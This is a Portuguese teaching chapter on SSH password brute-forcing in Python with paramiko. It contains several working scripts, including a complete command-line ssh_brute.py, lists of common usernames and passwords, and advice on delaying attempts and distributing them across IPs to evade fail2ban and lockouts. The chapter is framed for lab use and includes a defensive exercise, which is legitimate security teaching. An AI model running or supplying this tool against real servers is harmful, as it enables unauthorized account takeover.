# Capítulo 10 — Força Bruta SSH

**Objetivos deste capítulo:**
- Entender o que é um ataque de força bruta
- Construir um testador de senhas SSH em Python
- Usar a biblioteca paramiko para conexões SSH
- Implementar pausas entre tentativas (rate limiting)
- Gerar relatório de senhas encontradas

---

## O que é força bruta?

Força bruta é a tentativa sistemática de todas as combinações possíveis de senha até encontrar a correta. É como tentar todas as chaves de um chaveiro até achar a que abre a porta.

No mundo digital, um ataque de força bruta testa senhas contra um serviço (SSH, HTTP, FTP) até encontrar a credencial correta.

**Aviso importante:** Este capítulo tem fins **educacionais**. Teste estas técnicas apenas em sistemas que você possui ou tem autorização para testar. Testar em sistemas de terceiros sem permissão é crime no Brasil (Lei 12.737/2012 — Lei Carolina Dieckmann).

---

## Instalando o paramiko

O `paramiko` é a biblioteca Python para conexões SSH. Instale com:

```bash
pip install paramiko
```

---

## Passo 1 — Testando uma única credencial

Vamos começar testando se um usuário e senha funcionam num host:

```python
import paramiko
import socket

def testar_credencial(host, usuario, senha, porta=22):
    """Tenta conectar via SSH com uma credencial."""
    try:
        cliente = paramiko.SSHClient()
        # Não verifica chave do host (aceita qualquer uma)
        cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # Tenta conectar
        cliente.connect(
            host,
            port=porta,
            username=usuario,
            password=senha,
            timeout=5  # Timeout de 5 segundos
        )
        cliente.close()
        return True  # Conexão bem-sucedida!
    except paramiko.AuthenticationException:
        return False  # Senha errada
    except socket.timeout:
        return False  # Timeout
    except Exception as e:
        print(f"  Erro: {e}")
        return False

# Teste
host = "192.168.1.100"
usuario = "root"
senha = "123456"

if testar_credencial(host, usuario, senha):
    print(f"SENHA ENCONTRADA: {usuario}:{senha}")
else:
    print("Senha incorreta")
```

Explicação linha por linha:

- **`SSHClient()`**: cria um cliente SSH
- **`set_missing_host_key_policy(AutoAddPolicy())`**: aceita a chave do host automaticamente (útil para laboratório, mas evite em produção)
- **`connect()`**: tenta estabelecer a conexão com usuário e senha
- **`AuthenticationException`**: exceção específica para senha errada — é como o SSH diz "não foi dessa vez"
- **`timeout=5`**: se o host não responder em 5 segundos, desiste

---

## Passo 2 — Força bruta com lista de senhas

Agora vamos testar várias senhas contra um mesmo usuário:

```python
import paramiko
import socket
import time

def forca_bruta_ssh(host, usuario, lista_senhas, porta=22, delay=1):
    """
    Tenta várias senhas contra um usuário SSH.
    delay: segundos de pausa entre tentativas (rate limiting).
    """
    print(f"Iniciando força bruta SSH em {host}")
    print(f"Usuário: {usuario}  |  {len(lista_senhas)} senhas para testar")
    print("-" * 60)

    encontrada = None

    for i, senha in enumerate(lista_senhas, 1):
        # print(f"  [{i}/{len(lista_senhas)}] Testando: {senha}")
        # ^ Comentei para não poluir a tela

        try:
            cliente = paramiko.SSHClient()
            cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            cliente.connect(
                host,
                port=porta,
                username=usuario,
                password=senha,
                timeout=3
            )
            cliente.close()
            encontrada = senha
            print(f"\n{'='*60}")
            print(f"  ✓ SENHA ENCONTRADA!")
            print(f"    Host:     {host}")
            print(f"    Usuário:  {usuario}")
            print(f"    Senha:    {senha}")
            print(f"{'='*60}")
            break

        except paramiko.AuthenticationException:
            # Senha errada — continua normal
            pass
        except socket.timeout:
            print(f"  [!] Timeout — host pode estar offline")
            break
        except paramiko.ssh_exception.NoValidConnectionsError:
            print(f"  [!] Não foi possível conectar — porta SSH fechada?")
            break
        except KeyboardInterrupt:
            print(f"\n  [!] Interrompido pelo usuário.")
            break

        # Pausa entre tentativas (rate limiting)
        time.sleep(delay)

    if not encontrada:
        print("\n  ✗ Nenhuma senha encontrada na lista.")
    return encontrada

# Carregar lista de senhas de um arquivo
with open("senhas_comuns.txt", "r") as f:
    senhas = [linha.strip() for linha in f if linha.strip()]

# Executar
forca_bruta_ssh("192.168.1.100", "root", senhas, delay=0.5)
```

---

## Passo 3 — Força bruta com múltiplos usuários

Muitas vezes você não sabe qual usuário testar. Vamos testar vários usuários também:

```python
def forca_bruta_completa(host, usuarios, senhas, porta=22, delay=0.5):
    """Testa múltiplos usuários contra múltiplas senhas."""
    print(f"Força bruta SSH completa em {host}")
    print(f"  Usuários: {len(usuarios)}")
    print(f"  Senhas:   {len(senhas)}")
    print(f"  Total:    {len(usuarios) * len(senhas)} tentativas")
    print("-" * 60)

    encontradas = []

    for usuario in usuarios:
        for senha in senhas:
            try:
                cliente = paramiko.SSHClient()
                cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                cliente.connect(host, port=porta, username=usuario, password=senha, timeout=3)
                cliente.close()
                encontradas.append((usuario, senha))
                print(f"  ✓ {usuario}:{senha} — ENCONTRADA!")
            except paramiko.AuthenticationException:
                pass
            except (socket.timeout, paramiko.ssh_exception.NoValidConnectionsError):
                print(f"  [!] Conexão perdida — encerrando.")
                return encontradas

            time.sleep(delay)

    return encontradas

# Listas de exemplo
usuarios_teste = ["root", "admin", "administrator", "user", "teste"]
senhas_teste = [
    "123456", "senha", "admin", "password", "12345678",
    "root", "teste", "admin123", "qwerty", "letmein"
]

resultados = forca_bruta_completa("192.168.1.100", usuarios_teste, senhas_teste)
```

---

## Código completo do brute force SSH

```python
#!/usr/bin/env python3
"""
Força bruta SSH.
Uso: python3 ssh_brute.py <host> <usuario> <arquivo_senhas>
"""

import paramiko
import socket
import sys
import time
import logging

logging.basicConfig(level=logging.INFO, format="%(message)s")
log = logging.getLogger(__name__)

def testar(host, usuario, senha, porta=22):
    """Testa uma credencial SSH."""
    try:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(host, port=porta, username=usuario, password=senha, timeout=3)
        c.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        log.debug(f"Erro: {e}")
        return None  # Erro de conexão (não é senha errada)

def brute(host, usuario, senhas, porta=22, delay=0.5):
    """Executa força bruta."""
    log.info(f"Alvo: {host}:{porta} | Usuário: {usuario}")
    log.info(f"Senhas: {len(senhas)} | Delay: {delay}s\n")

    for i, senha in enumerate(senhas, 1):
        if i % 100 == 0:
            log.info(f"  Progresso: {i}/{len(senhas)}")

        resultado = testar(host, usuario, senha, porta)

        if resultado is True:
            log.info(f"\n{'='*50}")
            log.info(f"SENHA ENCONTRADA!")
            log.info(f"  Host:    {host}:{porta}")
            log.info(f"  Usuário: {usuario}")
            log.info(f"  Senha:   {senha}")
            log.info(f"{'='*50}")
            return senha
        elif resultado is None:
            log.info(f"  [!] Erro de conexão — provável bloqueio.")
            break

        time.sleep(delay)

    log.info(f"\nSenha não encontrada na lista.")
    return None

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Uso: python3 ssh_brute.py <host> <usuario> <arquivo_senhas>")
        sys.exit(1)

    host = sys.argv[1]
    usuario = sys.argv[2]
    arquivo = sys.argv[3]

    with open(arquivo) as f:
        senhas = [l.strip() for l in f if l.strip()]

    brute(host, usuario, senhas)
```

---

## Rate limiting — por que esperar entre tentativas?

Você reparou no `time.sleep(delay)` entre cada tentativa? Isso não é um bug — é um recurso. Sistemas reais detectam e bloqueiam tentativas muito rápidas:

- **fail2ban** bloqueia IPs com muitas tentativas em curto espaço de tempo
- **Contas são bloqueadas** após N tentativas consecutivas
- **Logs são gerados** — e administradores atentos percebem

Na vida real, um ataque de força bruta eficiente usa delay de 1-5 segundos e roda de vários IPs diferentes (força bruta distribuída).

---

## Exercícios do Capítulo

### Exercício 1 — Crie um alvo de testes

Use o contêiner Metasploitable 2 ou configure um servidor SSH com senha fraca em laboratório. Teste o brute force contra ele.

### Exercício 2 — Gerador de relatório

Modifique o programa para salvar um relatório JSON com:
- Host, usuário, lista de senhas testadas
- Senha encontrada (ou não)
- Tempo total de execução
- Número de tentativas

### Exercício 3 — Modo verboso

Adicione uma flag `--verbose` que exibe cada tentativa. Sem a flag, só exibe progresso a cada 100 tentativas.

### Exercício 4 — Defesa contra brute force

Pesquise sobre **fail2ban** e escreva um script Python que simule a detecção: leia um log SSH e bloqueie IPs com mais de 5 tentativas em 1 minuto (usando iptables ou hosts.deny).

---

## Resumo do Capítulo

- **Força bruta** testa combinações de senhas até encontrar a correta
- **paramiko** é a biblioteca Python para conexões SSH
- `AuthenticationException` indica senha errada (tentar próximo)
- **Rate limiting** (`delay`) evita bloqueio por sistemas de detecção
- Ataques reais usam **listas de senhas comuns** (rockyou.txt tem 14 milhões)
- **Defesa**: fail2ban, senhas fortes, autenticação por chave, 2FA

No próximo capítulo, voltamos à defesa com um **analisador de logs** que detecta padrões suspeitos em arquivos de log.